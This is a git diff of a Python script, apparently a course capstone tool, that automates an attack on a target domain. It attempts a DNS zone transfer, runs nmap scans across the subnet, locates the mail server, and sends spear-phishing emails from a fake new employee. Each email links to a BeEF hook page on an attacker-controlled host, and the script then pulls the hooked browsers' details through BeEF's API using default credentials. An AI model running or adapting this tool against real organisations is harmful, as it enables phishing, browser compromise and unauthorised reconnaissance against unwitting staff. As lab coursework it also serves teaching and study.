@@ -1,11 +1,12 @@
 #!/usr/bin/env python
 
-# autocapstone v0.2 - Austin Jackson
+# Autocapstone v0.3 - Austin Jackson
 # Given a url, attempts to automate the first two phases of the offensive
 # methodology process taught in the OMA course.
 
 import json
 import os
+import subprocess
 import sys
 import time
 from email_crawl import crawl
@@ -20,8 +21,18 @@ def prompt_stop():
         sys.exit(1)
 
 if __name__ == "__main__":
+    # email template
+    email_text = '''Hey there!<br/ >
+
+    I'm new in the office and ran into this webpage, what is this?<br/ >
+
+    <a href="http://192.168.169.140:3000/demos/{}.html">link</a><br/ >
+
+    Thanks so much,<br/ >
+    Mike Robinson'''
+
     print '----------------------------------'
-    print 'Autocapstone v0.2 - Austin Jackson'
+    print 'Autocapstone v0.3 - Austin Jackson'
     print '----------------------------------'
     url = raw_input('Url? ')
 
@@ -61,7 +72,7 @@ if __name__ == "__main__":
         print 'Name server could not be found.'
         prompt_stop()
 
-    # zone transfer
+    # attempt zone transfer
     try:
         write_cmd('dig @{0} {1} AXFR'.format(ns_ip, url), 'zonetransfer')
         print 'Zone Transfer was successful.'
@@ -88,7 +99,7 @@ if __name__ == "__main__":
     ##### PHASE 2
     print '\n------SCANNING-&-ENUMERATION------'
 
-    # Gather IP's
+    # probe scan to gather IP's
     hosts = []
     subnet = '.'.join(web_ip.split('.')[0:3]) + '.0/24'
     print 'Performing probe scan on {}...'.format(subnet)
@@ -98,86 +109,85 @@ if __name__ == "__main__":
             if 'Nmap scan report' in line:
                 hosts.append(line.split()[-1])
 
-    # host scanning
+    # scan discovered hosts
     print 'Agressively scanning hosts (this may take a while)...'
     for host in hosts:
         print 'Scanning {}'.format(host)
         write_cmd('nmap -A {}'.format(host), 'nmap_{}'.format(host))
 
-    # Get mail server IP
+    # get mail server IP
     with open('zonetransfer.txt') as f:
         for line in f.readlines():
             try:
                 ip = line.split()[-1]
-                if ('mail' in line) and (ip.split('.')[0] == web_ip.split('.')[0]):
+                if  ('mail' in line) and \
+                    (ip.split('.')[0] == web_ip.split('.')[0]):
                     mail_ip = ip
                     break
             except:
                 continue
 
-    # email_template
-    email_text = '''Hey there!<br/ >
-
-    I'm new in the office and ran into this webpage, what is this?<br/ >
-
-    <a href="http://192.168.169.140:3000/demos/{}.html">link</a><br/ >
-
-    Thanks so much,<br/ >
-    Mike Robinson'''
-
     # auto spear phish
     try:
         mail_ip
-        print "IP of mail server found."
+        print "IP of mail server found, attempting spear phishing."
 
         email_count = 0
         with open("emails.txt") as f:
-            for email in f.readlines():
+            for victim in f.read().splitlines():
                 email_count += 1
-                victim = email.rstrip('\n')
                 fname = victim.split('@')[0]
 
                 # create custom redirects
-                os.system('cp /usr/share/beef-xss/extensions/demos/html/redirect.html \
-    /usr/share/beef-xss/extensions/demos/html/{}.html'.format(fname))
-                tmp_email = open('/root/scripts/fake_email.html', 'w')
-                tmp_email.write(email_text.format(fname))
-                tmp_email.close()
+                subprocess.Popen(['cp', \
+                '/usr/share/beef-xss/extensions/demos/html/redirect.html', \
+                '/usr/share/beef-xss/extensions/demos/html/{}.html'.format(\
+                fname)])
 
-                email_cmd = 'sendemail -f mrobinson@{0} -t {1} -u \"Hello!\" -s {2}:25 -o \
-    message-content-type=html -o message-file=/root/scripts/fake_email.html'.format(url, victim, mail_ip)
-                os.system(email_cmd)
-                print 'Spear phishing email has been sent to', victim
-        raw_input("Press ENTER when beef is gucci!")
+                with open('/root/scripts/fake_email.html', 'w') as f:
+                    f.write(email_text.format(fname))
+
+                email_cmd = list('sendemail -f mrobinson@{0} -t {1} \
+                -u \"Hello!\" -s {2}:25 -o message-content-type=html \
+                -o message-file=/root/scripts/fake_email.html'.format(\
+                url, victim, mail_ip).split())
+                subprocess.Popen(email_cmd)
+
+                print "Spear phishing email sent to {}!".format(victim)
+
         # wait until check in
+        raw_input("Press ENTER when beef has all browsers reported in!")
     except:
         print "Mail server IP was not found, not attempting spear phishing."
 
-    # beefness
-    token = os.popen('curl -H "Content-Type: application/json" -X POST -d \'{"username":"beef", \
-    "password":"beef"}\' http://127.0.0.1:3000/api/admin/login').read().split('"')[-2]
+    # get hooks from beef
+    token = os.popen('curl -H "Content-Type: application/json" -X POST \
+    -d \'{"username":"beef", "password":"beef"}\' \
+    http://127.0.0.1:3000/api/admin/login').read().split('"')[-2]
     write_cmd('curl http://127.0.0.1:3000/api/hooks?token='+token, 'hooks')
-
     with open('hooks.txt', 'r') as f:
         hook_data = json.load(f)
 
-    # get sessions for browsers, should just do all!
+    # get sessions for browsers
     beef_data = []
     for n in range(email_count):
         try:
             session = hook_data['hooked-browsers']['offline'][str(n)]['session']
-            name    = hook_data['hooked-browsers']['offline'][str(n)]['page_uri'][34:-5]
+            name    = hook_data['hooked-browsers']['offline'][str(n)]\
+                      ['page_uri'][34:-5]
             beef_data.append([session, name])
         except:
             continue
 
-    # browser data is fked up here (not a json object)
-    for x in beef_data:
-        write_cmd('curl http://127.0.0.1:3000/api/hooks/{0}?token={1}'.format(x[1],token), '{0}_browser'.format(x[1]))
-        with open('{0}_browser.txt'.format(x[1]), 'r') as f:
+    # generate files with browser info
+    for data in beef_data:
+        name = data[1]
+        write_cmd('curl http://127.0.0.1:3000/api/hooks/{0}?token={1}'.format(\
+        name, token), '{}_browser'.format(name))
+        with open('{}_browser.txt'.format(name), 'r') as f:
             browser_data = json.load(f)
-        print x[1], 'using', browser_data['BrowserName'], browser_data['BrowserVersion']
-
+        print '{0} using {1} {2}'.format(name, browser_data['BrowserName'], \
+        browser_data['BrowserVersion'])
 
     print '----------------------------------'
     print 'Done, double check files please!!!'
